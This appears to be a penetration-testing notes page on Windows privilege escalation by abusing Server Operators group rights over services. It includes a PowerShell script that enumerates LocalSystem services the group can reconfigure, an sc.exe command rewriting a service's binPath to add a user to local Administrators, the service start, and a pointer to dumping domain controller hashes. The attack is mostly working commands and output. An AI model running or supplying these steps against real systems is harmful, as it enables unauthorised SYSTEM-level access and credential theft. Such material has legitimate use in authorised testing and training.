---
title: Server Operators
date: 2026-03-06 11:43:03
categories:
  - Active Directory
  - Windows
  - Post-Exploitation
  - Windows Privesc
  - Groups
---

> ➜ Members of the `Server Operators` group may have `SERVICE_ALL_ACCESS` or `SERVICE_CHANGE_CONFIG` permissions on certain services. These permissions allow modification of the service configuration, including the `binPath`.
>
> ➜ If the targeted service runs as `LocalSystem`, modifying its `binPath` allows execution of arbitrary commands with `NT AUTHORITY\SYSTEM` privileges, resulting in full local privilege escalation.

### Enumerating Services Running as `LocalSystem` and Controllable by `Server Operators`

> To identify exploitable services, we enumerate all services running under the `LocalSystem` account and filter those where the `Server Operators` group has sufficient permissions.

```powershell
Get-CimInstance Win32_Service | Where-Object {$_.StartName -eq "LocalSystem"} | ForEach-Object {
    $sd = sc.exe sdshow $_.Name
    if ($sd -match "\(A;;(FA|[^;]*CC[^;]*);;;SO\)") {
        Write-Output "[+] Exploitable Service: $($_.Name)"
        Write-Output "    StartName : $($_.StartName)"
        Write-Output "    State     : $($_.State)"
        Write-Output "    Path      : $($_.PathName)"
        Write-Output ""
    }
} > C:\Users\server_adm\Desktop\exploitable_services.txt

[+] Exploitable Service: AppReadiness
    StartName : LocalSystem
    State     : Stopped
    Path      : C:\Windows\System32\svchost.exe -k AppReadiness -p

[+] Exploitable Service: MozillaMaintenance
    StartName : LocalSystem
    State     : Stopped
    Path      : "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"

[+] Exploitable Service: Themes
    StartName : LocalSystem
    State     : Running
    Path      : C:\Windows\System32\svchost.exe -k netsvcs -p

<SNIP>
```

### Selecting a Safe Exploitation Target

> ➜ To minimize operational impact and maintain system stability, priority should be given to services that meet the following criteria:
>
>   * Third-party services
>   * Custom services
>   * Non-critical Windows services
>

>
> And :
>
>   * Services configured with `START_TYPE : DEMAND_START`
>

### Modifying the Service Binary Path

> ➜ By modifying the `service binary path` and injecting a malicious command, we can add our user to the local Administrators group.

```powershell
PS C:\Users\server_adm> sc.exe config MozillaMaintenance binPath= "cmd.exe /c net localgroup Administrators server_adm /add"

[SC] ChangeServiceConfig SUCCESS
```

### Starting the Service

> ➜ Starting the service fails, which is expected because the service binary path was replaced with cmd.exe, which executes the malicious command as SYSTEM and exits immediately without behaving like a real service, causing Windows to report a timeout while the payload still runs successfully.

```powershell
PS C:\Users\server_adm> sc.exe start MozillaMaintenance

[SC] StartService FAILED 1053:
The service did not respond to the start or control request in a timely fashion.
```

> ➜ Then we can dump hashes from the DC.
